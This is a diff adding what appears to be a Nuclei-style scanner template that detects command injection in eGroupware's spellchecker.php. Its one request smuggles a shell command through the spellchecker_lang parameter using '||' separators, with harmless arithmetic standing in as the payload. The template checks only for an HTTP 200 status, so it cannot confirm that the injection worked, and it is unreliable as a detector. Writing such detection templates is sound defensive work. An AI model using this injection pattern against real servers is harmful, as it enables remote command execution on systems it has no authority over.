@@ -1,0 +1,21 @@
+id: poc-yaml-egroupware-spellchecker-rce
+
+info:
+  name: poc-yaml-egroupware-spellchecker-rce
+  author: sharecast
+  severity: high
+  tags: xray-converted,rce,ct-24425
+  reference:
+    - https://github.com/Ret2LC/BetterSploit/blob/e8d1d5f8a41508c2b376c84cb57dbe61f48f38a4/BetterSploit/exploitz/exploitz/eGroupWare-1.14-spellchecker-RCE.py
+
+http:
+  - raw:
+      - |
+        GET /egroupware/phpgwapi/js/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php?spellchecker_lang=egroupware_spellchecker_cmd_exec.nasl%7C%7Cexpr%20{{rand_int(1000, 9999)}}%20%2d%20{{rand_int(1000, 9999)}}%7C%7C HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
